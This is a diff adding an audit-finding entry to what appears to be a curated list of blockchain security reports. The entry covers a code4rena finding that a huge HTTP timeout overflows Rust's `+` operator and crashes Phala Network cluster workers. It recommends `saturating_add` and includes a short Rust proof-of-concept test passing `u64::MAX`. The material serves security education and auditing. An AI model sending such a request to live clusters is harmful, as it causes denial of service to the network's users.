@@ -314,3 +314,56 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 6. [Medium] An attacker can crash the cluster system by sending an HTTP request with a huge timeout
+
+### Panic error by `+` overflow
+
+- Summary: Attackers can crash cluster workers by sending requests with large timeouts, exploiting numeric overflow in Rust's `+` operator. This DoS attack costs nothing to the attacker and can be repeated to target multiple workers, disrupting the entire cluster system.
+
+- Impact & Recommendation: Consider using `saturating_add` instead of `+`
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-phala-network#m-04-an-attacker-can-crash-the-cluster-system-by-sending-an-http-request-with-a-huge-timeout) & [Report](https://code4rena.com/reports/2024-03-phala-network)
+
+    <details><summary>POC</summary>
+
+  ```rust
+    #[cfg(test)]
+    mod tests {
+        use crate::PinkRuntimeEnv;
+        use pink::chain_extension::{HttpRequest, PinkExtBackend};
+        use super::*;
+        #[test]
+        fn http_timeout_panics() {
+            mock_all_ext();
+            let ext = MockExtension;
+            assert_eq!(ext.address(), &AccountId32::new([0; 32]));
+            let responses = ext
+                .batch_http_request(
+                    vec![
+                        HttpRequest {
+                            method: "GET".into(),
+                            url: "https://httpbin.org/get".into(),
+                            body: Default::default(),
+                            headers: Default::default(),
+                        },
+                        HttpRequest {
+                            method: "GET".into(),
+                            url: "https://httpbin.org/get".into(),
+                            body: Default::default(),
+                            headers: Default::default(),
+                        },
+                    ],
+                    u64::MAX, //@audit this will cause an overflow
+                )
+                .unwrap()
+                .unwrap();
+            assert_eq!(responses.len(), 2);
+            for response in responses {
+                assert!(response.is_ok());
+            }
+        }
+    }
+
+  ```
+
+    </details>
